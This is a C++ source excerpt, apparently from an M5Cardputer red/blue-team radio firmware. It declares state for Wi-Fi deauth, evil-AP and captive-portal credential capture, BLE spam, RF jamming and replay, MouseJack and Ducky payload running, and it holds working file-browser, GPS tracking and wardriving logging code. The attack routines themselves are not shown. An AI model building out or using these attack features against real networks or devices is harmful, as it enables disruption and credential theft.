#include "apps.h"
#include "hardware.h"
#include "ir.h"
#include "nfc.h"
#include "status.h"
#include "theme.h"

#include "usb_hid.h"
#include <BLEDevice.h>
#include <DNSServer.h>
#include <FS.h>
#include <LittleFS.h>
#include <M5Cardputer.h>
#include <Preferences.h>
#include <SD.h>
#include <WebServer.h>
#include <WiFi.h>
#include <esp_gap_ble_api.h>
#include <esp_wifi.h>

// Rename mode globals — set by main.cpp each frame
char g_appTypedChar = 0;
bool g_appTypedBackspace = false;

namespace {

constexpr int kScreenW = 240;
constexpr int kScreenH = 135;
constexpr int kWifiVisibleRows = 6;
constexpr int kBleVisibleRows = 6;

enum class WifiSortMode {
  Rssi,
  Channel,
  OpenFirst,
  NewFirst,
  Threat,
};

enum class BlueWifiView {
  Menu,
  DeviceWatch,
  Detail,
  ThreatFeed,
  ApIntel,
  ChannelMap,
};

enum class BleSortMode {
  Rssi,
  NewFirst,
  Threat,
};

enum class BlueBleView {
  Menu,
  DeviceWatch,
  Detail,
  TrackerHunt,
  UuidIntel,
  ThreatFeed,
};

enum class BlueGpsView {
  Menu,
  Status,
  Tracker,
  Wardriving,
};

enum class FilesView {
  RootMenu,
  Browser,
  ConfirmDelete,
};

enum class StorageTarget {
  Internal,
  Sd,
};

static void runWifiScan();

struct WifiScanItem {
  String ssid;
  String bssid;
  int32_t rssi;
  int32_t prevRssi;
  int32_t channel;
  int32_t prevChannel;
  wifi_auth_mode_t auth;
  wifi_auth_mode_t prevAuth;
  bool isNew;
  bool isGone;
  bool changed;
  bool hidden;
  bool duplicateSsid;
  bool crowdedChannel;
  bool authChanged;
  bool strongSignalJump;
  bool evilTwinSuspect;
  bool captivePortalSuspect;
  bool spamSuspect;
  bool rogueSuspect;
  bool jamSuspect;
  bool macSpoofSuspect;
  int riskScore;
  uint32_t firstSeenScan;
  uint32_t lastSeenScan;
};

struct BleScanItem {
  String name;
  String address;
  String vendorHint;
  String roleHint;
  int32_t rssi;
  int32_t prevRssi;
  bool isNew;
  bool changed;
  bool randomAddress;
  bool noName;
  bool serviceRich;
  bool trackerSuspect;
  bool beaconSuspect;
  bool spamSuspect;
  bool churnSuspect;
  bool rogueSuspect;
  int manufacturerLen;
  int serviceCount;
  int riskScore;
  uint32_t firstSeenScan;
  uint32_t lastSeenScan;
};

enum class AlertSource {
  Wifi,
  Ble,
};

struct AlertItem {
  AlertSource source;
  int sourceIndex;
  int riskScore;
  String label;
  String reason;
};

struct FileBrowserEntry {
  String name;
  String path;
  bool isDir;
  size_t size;
};

struct StorageStats {
  bool mounted;
  uint64_t totalBytes;
  uint64_t usedBytes;
  uint16_t fileCount;
  uint16_t dirCount;
};

constexpr int kMaxBrowserEntries = 32;
constexpr int kFileVisibleRows = 6;
FilesView g_filesView = FilesView::RootMenu;
StorageTarget g_filesTarget = StorageTarget::Internal;
int g_filesMenuIndex = 0;
int g_filesSelected = 0;
int g_filesScroll = 0;
String g_filesCurrentPath = "/";
String g_filesDeletePath;
bool g_littleFsMounted = false;
bool g_sdMounted = false;
FileBrowserEntry g_browserEntries[kMaxBrowserEntries];
int g_browserCount = 0;

WifiScanItem g_wifiItems[32];
int g_wifiCount = 0;
int g_wifiSelected = 0;
int g_wifiScroll = 0;
bool g_wifiDetail = false;
int g_blueWifiMenuIndex = 0;
BlueWifiView g_blueWifiView = BlueWifiView::Menu;
int g_wifiThreatIndices[8] = {0};
int g_wifiThreatCount = 0;
int g_wifiThreatSelected = 0;
int g_wifiOpenCount = 0;
int g_wifiSecureCount = 0;
int g_wifiChannelCounts[14] = {0};
uint32_t g_wifiScanGeneration = 0;
int g_wifiNewCount = 0;
int g_wifiGoneCount = 0;
int g_wifiChangedCount = 0;
WifiSortMode g_wifiSortMode = WifiSortMode::Rssi;
int g_wifiPrevChannelCounts[14] = {0};
int g_wifiChannelVolatility = 0;
int g_wifiJamScore = 0;
bool g_bleReady = false;
BleScanItem g_bleItems[40];
int g_bleCount = 0;
int g_bleSelected = 0;
int g_bleScroll = 0;
bool g_bleDetail = false;
int g_blueBleMenuIndex = 0;
BlueBleView g_blueBleView = BlueBleView::Menu;
int g_bleThreatIndices[8] = {0};
int g_bleThreatCount = 0;
int g_bleThreatSelected = 0;
int g_bleNewCount = 0;
int g_bleChangedCount = 0;
int g_bleSpamCount = 0;
uint32_t g_bleScanGeneration = 0;
BleSortMode g_bleSortMode = BleSortMode::Rssi;
AlertItem g_alertItems[32];
int g_alertCount = 0;
int g_alertSelected = 0;
int g_alertScroll = 0;
bool g_alertDetail = false;
int g_blueGpsMenuIndex = 0;
BlueGpsView g_blueGpsView = BlueGpsView::Menu;
GpsFix g_gpsFix = {};
double g_gpsLastLat = 0.0;
double g_gpsLastLon = 0.0;
double g_gpsTripMeters = 0.0;
double g_gpsMaxSpeedKmph = 0.0;
uint32_t g_gpsFixCount = 0;
bool g_gpsTrackerLogging = false;
bool g_gpsWardriveLogging = false;
uint32_t g_gpsLastTrackLogMs = 0;
uint32_t g_gpsLastWardriveLogMs = 0;
String g_gpsLastLogPath = "";

enum class WifiOpsState { MainMenu, List, ActionMenu, Detail, Attacking };
enum class WifiAttackType { None, Deauth, EvilAP, CaptivePortal, BeaconFlood, DeauthSweep };

int g_redWifiSelected = 0;
int g_redWifiScroll = 0;
WifiOpsState g_redWifiState = WifiOpsState::MainMenu;
bool g_redWifiScanned = false;
int g_redWifiTopMenuSel = 0;
int g_redWifiMenuSel = 0;
WifiAttackType g_redWifiAttack = WifiAttackType::None;
int g_redWifiAttackCount = 0;
uint32_t g_redWifiAttackMs = 0;
uint32_t g_redWifiAttackStartMs = 0;
String g_redWifiAttackTarget;
bool g_redWifiEvilApActive = false;
bool g_redWifiPortalActive = false;
int g_redWifiDeauthChannel = 6;
DNSServer g_dnsServer;
WebServer g_httpServer(80);
String g_portalCreds[8];
int g_portalCredCount = 0;

enum class BleOpsState { MainMenu, List, ActionMenu, Detail, Attacking };
enum class BleAttackType { None, AppleSpam, AndroidSpam, BleFlood, DeviceSpoof, CloneSpam };

int g_redBleSelected = 0;
int g_redBleScroll = 0;
BleOpsState g_redBleState = BleOpsState::MainMenu;
int g_redBleTopMenuSel = 0;
int g_redBleMenuSel = 0;
BleAttackType g_redBleAttack = BleAttackType::None;
int g_redBleAttackCount = 0;
uint32_t g_redBleAttackMs = 0;
uint32_t g_redBleAttackStartMs = 0;
String g_redBleAttackTarget;
bool g_redBleAdvertising = false;

const char* g_cc1101Bands[] = {"315", "433", "868", "915"};
int g_cc1101BandIndex = 1;
int g_cc1101SweepMs = 120;
int g_cc1101Sensitivity = 3;
bool g_cc1101Detail = false;
int g_cc1101RefreshCount = 0;
int g_cc1101LastGdo0 = 0;
int g_cc1101RiskScore = 0;
Cc1101ProbeResult g_cc1101Probe = {false, 0xFF, 0xFF, 0, 0xFF, 0xFF, 0xFF, 0xFF, -127};
Cc1101ProbeResult g_cc1101Survey[4];
int g_cc1101SurveyScore[4] = {0};
int g_cc1101SurveyHotIndex = 0;
enum class BlueCc1101View { Menu, Spectrum, Waterfall, Capture, SdReplay, Renaming };
BlueCc1101View g_blueCc1101View = BlueCc1101View::Menu;
static int   g_blueCc1101MenuSel = 0;
static Cc1101RawCapture g_blueRawCapture = {};
static bool  g_blueHasCapture    = false;
static int   g_blueCaptureCount  = 0;
static int   g_blueCaptureReplays = 0;
int g_cc1101PatternScore = 0;
int g_cc1101BurstScore = 0;
int g_cc1101EvidenceBand = 1;
int g_cc1101EvidenceRssi = -127;
int g_cc1101EvidenceBytes = 0;
int g_cc1101EvidenceScore = 0;
uint32_t g_cc1101EvidenceTick = 0;
static constexpr int kRfWaterfallCols = 28;
static constexpr int kRfDisplayBins = 48;
uint8_t g_cc1101Spectrum[4] = {0};
uint8_t g_cc1101Waterfall[kRfWaterfallCols][kRfDisplayBins] = {};
int g_cc1101WaterfallHead = 0;
int g_cc1101SweepRssi[kRfDisplayBins] = {};
uint8_t g_cc1101SweepLevel[kRfDisplayBins] = {};
uint8_t g_cc1101SweepPeak[kRfDisplayBins] = {};
uint8_t g_cc1101SweepPeakTimer[kRfDisplayBins] = {};
float g_cc1101SweepStart = 432.0f;
float g_cc1101SweepEnd = 435.0f;

const int g_nrfChannels[] = {2, 26, 40, 62, 82, 100, 120};
int g_nrfChannelIndex = 3;
int g_nrfWindowMs = 80;
int g_nrfDensity = 2;
bool g_nrfDetail = false;
int g_nrfRefreshCount = 0;
int g_nrfLastCe = 0;
int g_nrfRiskScore = 0;
Nrf24ProbeResult g_nrfProbe = {false, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0, 0, 0};
uint8_t g_nrfSweep[126] = {0};
int g_nrfHotChannel = 0;
int g_nrfHotValue = 0;
enum class BlueNrfView { Spectrum, Waterfall };
BlueNrfView g_blueNrfView = BlueNrfView::Spectrum;

// ── NFC state ────────────────────────────────────────────────────────────────
enum class NfcView { Menu, Scanning, TagDetail, SavedList, Emulating, Rename };
static NfcView  g_nfcView        = NfcView::Menu;
static int      g_nfcMenuSel     = 0;
static NfcTag   g_nfcLastTag     = {};
static int      g_nfcSdFileSel   = 0;
static int      g_nfcSdFileScroll = 0;
static char     g_nfcMsg[52]     = {};
static bool     g_nfcScanning   = false;
static int      g_nfcScanCount  = 0;
static bool     g_nfcReaderReady = false;
static uint32_t g_nfcLastScanAttemptMs = 0;
int g_nrfBurstScore = 0;
int g_nrfEvidenceChannel = 0;
int g_nrfEvidenceValue = 0;
int g_nrfEvidenceRpdHits = 0;
uint32_t g_nrfEvidenceTick = 0;
uint8_t g_nrfSpectrum[7] = {0};
uint8_t g_nrfWaterfall[kRfWaterfallCols][kRfDisplayBins] = {};
int g_nrfWaterfallHead = 0;
uint8_t g_nrfPeak[126] = {};
uint8_t g_nrfPeakTimer[126] = {};
uint8_t g_nrfDisplayLevel[kRfDisplayBins] = {};

enum class Cc1101OpsState { Menu, Monitoring, Jamming, Capturing, SdReplay, Renaming };
int g_redCc1101MenuSel = 0;
Cc1101OpsState g_redCc1101State = Cc1101OpsState::Menu;
int g_redCc1101BandIndex = 1;
int g_redCc1101JamCount = 0;
uint32_t g_redCc1101StartMs = 0;
bool g_redCc1101SweepMode = false;
int g_redCc1101SweepBandIdx = 0;
Cc1101RxCapture g_redCc1101Capture = {};
bool g_redCc1101HasCapture = false;
int g_redCc1101ReplayCount = 0;
Cc1101ProbeResult g_redCc1101MonProbe = {false, 0xFF, 0xFF, 0, 0xFF, 0xFF, 0xFF, 0xFF, -127};
static constexpr int kCc1101SdMaxFiles = 8;
static char g_cc1101SdFiles[kCc1101SdMaxFiles][48];
static int  g_cc1101SdFileCount = 0;
static int  g_cc1101SdFileSel   = 0;
static char g_cc1101SdMsg[52]   = {};

enum class Nrf24OpsState { Menu, Jamming, Scanning, MouseJack };
int g_redNrfOpsMenuSel = 0;
Nrf24OpsState g_redNrfOpsState = Nrf24OpsState::Menu;
int g_redNrfOpsChannel = 40;
int g_redNrfOpsJamCount = 0;
uint32_t g_redNrfOpsStartMs = 0;
bool g_redNrfOpsSweepMode = false;
int g_redNrfOpsSweepCh = 0;
uint8_t g_redNrfScanMap[126] = {};
bool g_redNrfScanned = false;
Nrf24ProbeResult g_redNrfOpsLast = {false, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0, 0, 0};

// ── MouseJack state (lives under nRF24 Ops, 5th menu item)
enum class MouseJackPhase { Scanning, Found, SelectPayload, Injecting, Done };
MouseJackPhase g_mjPhase = MouseJackPhase::Scanning;
EsbScanResult g_mjTarget = {};
int g_mjPayloadSel = 0;
int g_mjInjectCount = 0;

// ── IR Toolkit state
enum class IrState { Menu, Blasting, Receiving, SdReplay, Rename };
int g_irMenuSel = 0;
IrState g_irState = IrState::Menu;
int g_irBlastIndex = 0;
int g_irBlastCount = 0;
uint32_t g_irBlastStartMs = 0;
bool g_irBlastAc = false;
bool g_irBlastUniversal = false;
IrReceived g_irLastReceived = {false, 0, 0, 0};
IrRawCapture g_irRawCapture = {};
bool g_irHasCapture = false;
int g_irRepeatCount = 0;
uint32_t g_irRxStartMs = 0;
int g_irRxAttempts = 0;
// IR SD file browser state
static constexpr int kIrSdMaxFiles = 8;
static char g_irSdFiles[kIrSdMaxFiles][48];
static int  g_irSdFileCount = 0;
static int  g_irSdFileSel   = 0;
static char g_irSdMsg[48]   = {};

// ── RF Tools state
enum class RfToolsState { Menu, OokTx, DeBruijnTx, RawIrTx };
int g_rfToolsMenuSel = 0;
RfToolsState g_rfToolsState = RfToolsState::Menu;
int g_ookBandIndex = 1;
int g_ookPatternSel = 0;
int g_ookBurstCount = 0;
uint32_t g_ookStartMs = 0;
int g_dbBandIndex = 1;
int g_dbCodeBits = 8;
uint32_t g_dbLfsrState = 0;
int g_dbBurstCount = 0;
uint32_t g_dbStartMs = 0;
uint16_t g_rawIrAddr = 0xE0E0;
uint8_t  g_rawIrCmd  = 0x40;
int g_rawIrField = 0;
int g_rawIrSendCount = 0;

// ── Config / Settings
static Preferences g_prefs;
static int  g_cfgMenuSel     = 0;
static bool g_cfgAbout       = false;
static uint8_t g_cfgBrightness  = 128;
static int  g_cfgStartTeam   = 0;  // 0=Red 1=Blue
static int  g_cfgBleName     = 0;  // index into kBleNamePresets
static int  g_cfgOokRate     = 1;  // 0=1.2k 1=2.4k 2=4.8k
static int  g_cfgDefaultBand = 1;  // 0=315 1=433 2=868 3=915

static const char* kBleNamePresets[]    = { "Magic Keyboard", "iPhone 15", "AirPods Pro", "Galaxy S24" };
static const char* kOokRateLabels[]     = { "1.2 kbps", "2.4 kbps", "4.8 kbps" };
static const char* kCapRssiLabels[]     = { "-70 dBm", "-80 dBm", "-85 dBm", "-90 dBm" };
static const int   kCapRssiValues[]     = { -70, -80, -85, -90 };
static const char* kNfcTimeoutLabels[]  = { "1.0 s", "2.0 s", "3.0 s" };
static const int   kNfcTimeoutValues[]  = { 1000, 2000, 3000 };
static const char* kGpsUnitsLabels[]    = { "Metric", "Imperial" };
static const char* kCfgItemLabels[]     = {
  "Brightness", "Start Team", "BLE Name", "OOK Rate", "Def Band",
  "OOK Thresh", "NFC Scan", "GPS Units", "About"
};
static int g_cfgCaptureRssi = 2;  // index into kCapRssiLabels (default -85 dBm)
static int g_cfgNfcTimeout  = 1;  // index into kNfcTimeoutValues (default 2s)
static int g_cfgGpsUnits    = 0;  // 0=Metric 1=Imperial

static void settingsLoad() {
  g_prefs.begin("twoface", true);
  g_cfgBrightness   = g_prefs.getUChar("bright",    128);
  g_cfgStartTeam    = g_prefs.getUChar("team",      0);
  g_cfgBleName      = g_prefs.getUChar("blename",   0);
  g_cfgOokRate      = g_prefs.getUChar("ookrate",   1);
  g_cfgDefaultBand  = g_prefs.getUChar("band",      1);
  g_cfgCaptureRssi  = g_prefs.getUChar("caprssi",   2);
  g_cfgNfcTimeout   = g_prefs.getUChar("nfcto",     1);
  g_cfgGpsUnits     = g_prefs.getUChar("gpsunits",  0);
  g_prefs.end();
}

static void settingsSave() {
  g_prefs.begin("twoface", false);
  g_prefs.putUChar("bright",  g_cfgBrightness);
  g_prefs.putUChar("team",    (uint8_t)g_cfgStartTeam);
  g_prefs.putUChar("blename", (uint8_t)g_cfgBleName);
  g_prefs.putUChar("ookrate", (uint8_t)g_cfgOokRate);
  g_prefs.putUChar("band",    (uint8_t)g_cfgDefaultBand);
  g_prefs.putUChar("caprssi", (uint8_t)g_cfgCaptureRssi);
  g_prefs.putUChar("nfcto",   (uint8_t)g_cfgNfcTimeout);
  g_prefs.putUChar("gpsunits",(uint8_t)g_cfgGpsUnits);
  g_prefs.end();
}

static void settingsApply() {
  M5.Display.setBrightness(g_cfgBrightness);
  g_ookBandIndex       = g_cfgDefaultBand;
  g_dbBandIndex        = g_cfgDefaultBand;
  g_redCc1101BandIndex = g_cfgDefaultBand;
  g_cc1101BandIndex    = g_cfgDefaultBand;
}

static bool gpsUseImperial() {
  return g_cfgGpsUnits == 1;
}

static float gpsDisplayAltitude() {
  return gpsUseImperial() ? g_gpsFix.altitudeMeters * 3.28084f : g_gpsFix.altitudeMeters;
}

static float gpsDisplaySpeed(float kmph) {
  return gpsUseImperial() ? kmph * 0.621371f : kmph;
}

static float gpsDisplayDistance(double meters) {
  return gpsUseImperial() ? static_cast<float>(meters * 3.28084) : static_cast<float>(meters);
}

static const char* gpsAltUnit() {
  return gpsUseImperial() ? "ft" : "m";
}

static const char* gpsSpeedUnit() {
  return gpsUseImperial() ? "mph" : "km/h";
}

static const char* gpsDistUnit() {
  return gpsUseImperial() ? "ft" : "m";
}

static String gpsLastLogName() {
  if (!g_gpsLastLogPath.length()) return "none";
  const int slash = g_gpsLastLogPath.lastIndexOf('/');
  return slash >= 0 ? g_gpsLastLogPath.substring(slash + 1) : g_gpsLastLogPath;
}

// ── Payloads (USB-HID / Ducky Script) state
enum class PayloadState { FileList, Running, Done, NoCard };
PayloadState g_plState = PayloadState::FileList;
static constexpr int kPlMaxFiles   = 14;
static constexpr int kPlMaxNameLen = 40;
static char g_plFiles[kPlMaxFiles][kPlMaxNameLen];
static int  g_plFileCount  = 0;
static int  g_plFileSel    = 0;
static int  g_plFileScroll = 0;
static int  g_plLinesRun   = 0;
static bool g_plScanned    = false;
static char g_plLastError[48] = {};

static bool ensureLittleFsMounted();
static bool ensureSdMounted();

static const char* plBasename(const char* path) {
  const char* s = strrchr(path, '/');
  return s ? s + 1 : path;
}

static void plScanFiles() {
  g_plFileCount  = 0;
  g_plFileSel    = 0;
  g_plFileScroll = 0;
  if (!ensureSdMounted()) return;
  const char* dirs[] = {"/payloads", "/"};
  for (const char* dir : dirs) {
    File d = SD.open(dir);
    if (!d || !d.isDirectory()) { d.close(); continue; }
    while (g_plFileCount < kPlMaxFiles) {
      File f = d.openNextFile();
      if (!f) break;
      if (f.isDirectory()) { f.close(); continue; }
      const char* nm = f.name();
      int len = strlen(nm);
      bool ok = (len > 4 && strcasecmp(nm + len - 4, ".txt")   == 0) ||
                (len > 6 && strcasecmp(nm + len - 6, ".ducky") == 0);
      if (ok) {
        if (nm[0] == '/') {
          strncpy(g_plFiles[g_plFileCount], nm, kPlMaxNameLen - 1);
        } else {
          snprintf(g_plFiles[g_plFileCount], kPlMaxNameLen, "%s%s%s",
                   dir, strcmp(dir, "/") == 0 ? "" : "/", nm);
        }
        g_plFiles[g_plFileCount][kPlMaxNameLen - 1] = '\0';
        ++g_plFileCount;
      }
      f.close();
    }
    d.close();
    if (g_plFileCount > 0) break;
  }
}

static bool ensureLittleFsMounted() {
  if (!g_littleFsMounted) {
    g_littleFsMounted = LittleFS.begin(true);
  }
  return g_littleFsMounted;
}

static bool ensureSdMounted() {
  if (!g_sdMounted) {
    const HardwarePins& pins = hardwarePins();
    // Hold SX1262 in reset and deselect NSS before SD.begin() —
    // the SX1262 loads/drives MISO on the shared SPI bus even with NSS HIGH.
    digitalWrite(pins.loraSpiCs, HIGH);
    digitalWrite(pins.loraRst, LOW);
    g_sdMounted = SD.begin(pins.sdCs, SPI, 25000000);
  }
  return g_sdMounted && SD.cardType() != CARD_NONE;
}

static fs::FS* getFsForTarget(StorageTarget target, bool& mounted) {
  if (target == StorageTarget::Internal) {
    mounted = ensureLittleFsMounted();
    return mounted ? &LittleFS : nullptr;
  }
  mounted = ensureSdMounted();
  return mounted ? &SD : nullptr;
}

static const char* storageTargetName(StorageTarget target) {
  return target == StorageTarget::Internal ? "Internal Flash" : "SD Card";
}

// ── Shared rename state ───────────────────────────────────────────────────────
static char g_renameBuffer[32] = {};
static int  g_renameLen        = 0;
static char g_renameOldPath[56] = {};
static char g_renameDir[16]    = {};
static char g_renameExt[8]     = {};

static void renameBegin(const char* fullPath, const char* dir, const char* ext) {
  strncpy(g_renameOldPath, fullPath, sizeof(g_renameOldPath) - 1);
  strncpy(g_renameDir, dir, sizeof(g_renameDir) - 1);
  strncpy(g_renameExt, ext, sizeof(g_renameExt) - 1);
  const char* justName = strrchr(fullPath, '/');
  justName = justName ? justName + 1 : fullPath;
  int len = strlen(justName);
  const int extLen = strlen(ext);
  if (len > extLen && strcmp(justName + len - extLen, ext) == 0) len -= extLen;
  g_renameLen = len < (int)(sizeof(g_renameBuffer) - 1) ? len : (int)(sizeof(g_renameBuffer) - 1);
  memcpy(g_renameBuffer, justName, g_renameLen);
  g_renameBuffer[g_renameLen] = '\0';
}

static bool renameCommit() {
  if (g_renameLen == 0) return false;
  char newPath[72];
  snprintf(newPath, sizeof(newPath), "%s/%s%s", g_renameDir, g_renameBuffer, g_renameExt);
  return SD.rename(g_renameOldPath, newPath);
}

static void renameHandleChar() {
  const char c = g_appTypedChar;
  if (c == 0) return;
  if (g_renameLen < (int)(sizeof(g_renameBuffer) - 1) &&
      (isalnum((uint8_t)c) || c == '_' || c == '-' || c == ' ')) {
    g_renameBuffer[g_renameLen++] = c;
    g_renameBuffer[g_renameLen]   = '\0';
  }
}

static void drawRenameOverlay(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t bg     = themeModeBg(mode);
  M5.Display.fillRoundRect(16, 50, 208, 52, 4, kPanelAlt);
  M5.Display.drawRoundRect(16, 50, 208, 52, 4, accent);
  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(22, 55);
  M5.Display.print("Rename:");
  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(22, 65);
  M5.Display.printf("was: %.26s", strrchr(g_renameOldPath, '/') ? strrchr(g_renameOldPath, '/') + 1 : g_renameOldPath);
  M5.Display.fillRect(20, 76, 200, 14, bg);
  M5.Display.setTextColor(WHITE, bg);
  M5.Display.setCursor(22, 78);
  M5.Display.printf("%-29.29s", g_renameBuffer);
  M5.Display.setTextColor(accent, bg);
  M5.Display.print("_");
  M5.Display.fillRect(8, 124, 224, 10, bg);
  M5.Display.setTextColor(kDimText, bg);
  M5.Display.setCursor(4, 127);
  M5.Display.print("Ent save  Bk del  Fn+Bk cancel");
}

static String humanBytes(uint64_t bytes) {
  char buf[24];
  if (bytes >= (1024ULL * 1024ULL)) {
    snprintf(buf, sizeof(buf), "%.1f MB", bytes / 1048576.0);
  } else if (bytes >= 1024ULL) {
    snprintf(buf, sizeof(buf), "%.1f KB", bytes / 1024.0);
  } else {
    snprintf(buf, sizeof(buf), "%llu B", static_cast<unsigned long long>(bytes));
  }
  return String(buf);
}

static void trimBrowserScroll() {
  if (g_filesSelected < 0) g_filesSelected = 0;
  if (g_filesSelected >= g_browserCount) g_filesSelected = g_browserCount - 1;
  if (g_filesSelected < 0) g_filesSelected = 0;
  if (g_filesSelected < g_filesScroll) g_filesScroll = g_filesSelected;
  if (g_filesSelected >= g_filesScroll + kFileVisibleRows) {
    g_filesScroll = g_filesSelected - kFileVisibleRows + 1;
  }
  if (g_filesScroll < 0) g_filesScroll = 0;
}

static void scanBrowserEntries(StorageTarget target, const String& path) {
  g_browserCount = 0;
  g_filesSelected = 0;
  g_filesScroll = 0;
  g_filesCurrentPath = path.length() ? path : "/";

  bool mounted = false;
  fs::FS* fs = getFsForTarget(target, mounted);
  if (!fs || !mounted) return;

  File dir = fs->open(g_filesCurrentPath.c_str());
  if (!dir || !dir.isDirectory()) {
    dir.close();
    return;
  }

  if (g_filesCurrentPath != "/" && g_browserCount < kMaxBrowserEntries) {
    g_browserEntries[g_browserCount].isDir = true;
    g_browserEntries[g_browserCount].path = "..";
    g_browserEntries[g_browserCount].name = "..";
    g_browserEntries[g_browserCount].size = 0;
    ++g_browserCount;
  }

  while (g_browserCount < kMaxBrowserEntries) {
    File entry = dir.openNextFile();
    if (!entry) break;
    g_browserEntries[g_browserCount].isDir = entry.isDirectory();
    String fullPath = entry.path();
    if (!fullPath.length()) fullPath = entry.name();
    g_browserEntries[g_browserCount].path = fullPath;
    String leaf = fullPath;
    int slash = leaf.lastIndexOf('/');
    if (slash >= 0 && slash < leaf.length() - 1) leaf = leaf.substring(slash + 1);
    if (leaf.length() == 0) leaf = "/";
    g_browserEntries[g_browserCount].name = leaf;
    g_browserEntries[g_browserCount].size = entry.isDirectory() ? 0 : entry.size();
    ++g_browserCount;
    entry.close();
  }
  dir.close();
}

static bool deleteBrowserPath(StorageTarget target, const String& path) {
  bool mounted = false;
  fs::FS* fs = getFsForTarget(target, mounted);
  if (!fs || !mounted || path.isEmpty() || path == "/") return false;
  File probe = fs->open(path.c_str());
  if (!probe) return false;
  bool isDir = probe.isDirectory();
  probe.close();
  return isDir ? fs->rmdir(path.c_str()) : fs->remove(path.c_str());
}

static StorageStats getStorageStats(StorageTarget target) {
  StorageStats stats{};
  bool mounted = false;
  fs::FS* fs = getFsForTarget(target, mounted);
  stats.mounted = mounted && fs;
  if (!stats.mounted) return stats;

  if (target == StorageTarget::Internal) {
    stats.totalBytes = LittleFS.totalBytes();
    stats.usedBytes = LittleFS.usedBytes();
  } else {
    stats.totalBytes = SD.totalBytes();
    stats.usedBytes = SD.usedBytes();
  }

  File root = fs->open("/");
  if (!root || !root.isDirectory()) {
    root.close();
    return stats;
  }
  while (true) {
    File entry = root.openNextFile();
    if (!entry) break;
    if (entry.isDirectory()) ++stats.dirCount;
    else ++stats.fileCount;
    entry.close();
  }
  root.close();
  return stats;
}

static double quickDistanceMeters(double lat1, double lon1, double lat2, double lon2) {
  const double dx = (lon2 - lon1) * 111320.0 * cos((lat1 + lat2) * 0.5 * DEG_TO_RAD);
  const double dy = (lat2 - lat1) * 110540.0;
  return sqrt(dx * dx + dy * dy);
}

static bool ensureGpsLogDir() {
  if (!ensureSdMounted()) return false;
  if (SD.exists("/gps")) return true;
  return SD.mkdir("/gps");
}

static bool appendGpsLogLine(const char* path, const String& line) {
  if (!ensureGpsLogDir()) return false;
  File file = SD.open(path, FILE_APPEND);
  if (!file) return false;
  file.println(line);
  file.close();
  g_gpsLastLogPath = path;
  return true;
}

static bool logTrackerPoint() {
  if (!g_gpsFix.valid) return false;
  char row[196];
  snprintf(row, sizeof(row), "%s,%s,%.6f,%.6f,%.1f,%.1f,%.1f,%d,%.1f",
           g_gpsFix.dateText, g_gpsFix.timeText, g_gpsFix.latitude, g_gpsFix.longitude,
           g_gpsFix.altitudeMeters, g_gpsFix.speedKmph, g_gpsTripMeters, g_gpsFix.satellites,
           g_gpsFix.courseDeg);
  if (!SD.exists("/gps/tracker.csv")) {
    appendGpsLogLine("/gps/tracker.csv", "date,time,lat,lon,alt_m,speed_kmph,trip_m,sats,course_deg");
  }
  return appendGpsLogLine("/gps/tracker.csv", String(row));
}

static bool logWardrivePoint() {
  if (!g_gpsFix.valid) return false;
  runWifiScan();
  int strongestRssi = -127;
  String strongestSsid = "-";
  for (int i = 0; i < g_wifiCount; ++i) {
    if (g_wifiItems[i].rssi > strongestRssi) {
      strongestRssi = g_wifiItems[i].rssi;
      strongestSsid = g_wifiItems[i].ssid.length() ? g_wifiItems[i].ssid : "<hidden>";
    }
  }
  strongestSsid.replace(',', '_');
  char row[256];
  snprintf(row, sizeof(row), "%s,%s,%.6f,%.6f,%d,%d,%d,%s,%d",
           g_gpsFix.dateText, g_gpsFix.timeText, g_gpsFix.latitude, g_gpsFix.longitude,
           g_wifiCount, g_wifiOpenCount, g_wifiThreatCount, strongestSsid.c_str(), strongestRssi);
  if (!SD.exists("/gps/wardrive.csv")) {
    appendGpsLogLine("/gps/wardrive.csv", "date,time,lat,lon,ap_count,open_count,threat_count,strongest_ssid,strongest_rssi");
  }
  return appendGpsLogLine("/gps/wardrive.csv", String(row));
}

static void refreshGpsState() {
  hardwareGpsUpdate();
  g_gpsFix = hardwareGpsGetFix();
  if (!g_gpsFix.valid) return;
  if (g_gpsFixCount > 0) {
    const double delta = quickDistanceMeters(g_gpsLastLat, g_gpsLastLon, g_gpsFix.latitude, g_gpsFix.longitude);
    if (delta > 0.8 && delta < 500.0) {
      g_gpsTripMeters += delta;
    }
  }
  g_gpsLastLat = g_gpsFix.latitude;
  g_gpsLastLon = g_gpsFix.longitude;
  ++g_gpsFixCount;
  if (g_gpsFix.speedKmph > g_gpsMaxSpeedKmph) g_gpsMaxSpeedKmph = g_gpsFix.speedKmph;

  const uint32_t now = millis();
  if (g_gpsTrackerLogging && now - g_gpsLastTrackLogMs >= 4000) {
    if (logTrackerPoint()) g_gpsLastTrackLogMs = now;
  }
  if (g_gpsWardriveLogging && now - g_gpsLastWardriveLogMs >= 7000) {
    if (logWardrivePoint()) g_gpsLastWardriveLogMs = now;
  }
}

constexpr AppEntry kRedApps[] = {
    {AppId::WifiOps, "WiFi"},
    {AppId::BleOps, "BLE Ops"},
    {AppId::IrToolkit, "IR"},
    {AppId::Payloads, "Payloads"},
    {AppId::Cc1101Ops, "CC1101"},
    {AppId::Nrf24Ops, "nRF24"},
    {AppId::RfTools, "RF Tools"},
    {AppId::Files, "Files"},
    {AppId::Settings, "Config"},
};

constexpr AppEntry kBlueApps[] = {
    {AppId::WifiMonitor, "WiFi Mon"},
    {AppId::BleMonitor, "BLE Mon"},
    {AppId::GpsMonitor, "GPS"},
    {AppId::Cc1101Scan, "CC1101"},
    {AppId::NrfAnalyzer, "nRF24"},
    {AppId::NfcScanner, "NFC"},
    {AppId::DeviceHealth, "Health"},
    {AppId::Files, "Files"},
    {AppId::Settings, "Config"},
};

void drawSignalBars(int x, int y, uint16_t color) {
  M5.Display.fillRoundRect(x, y + 12, 6, 8, 2, color);
  M5.Display.fillRoundRect(x + 9, y + 8, 6, 12, 2, color);
  M5.Display.fillRoundRect(x + 18, y + 4, 6, 16, 2, color);
}

void drawRedPanelFrame(int x, int y, int w, int h, uint16_t accent) {
  M5.Display.fillRoundRect(x, y, w, h, 3, themeModePanel(TeamMode::Red));
  M5.Display.drawRoundRect(x, y, w, h, 3, accent);
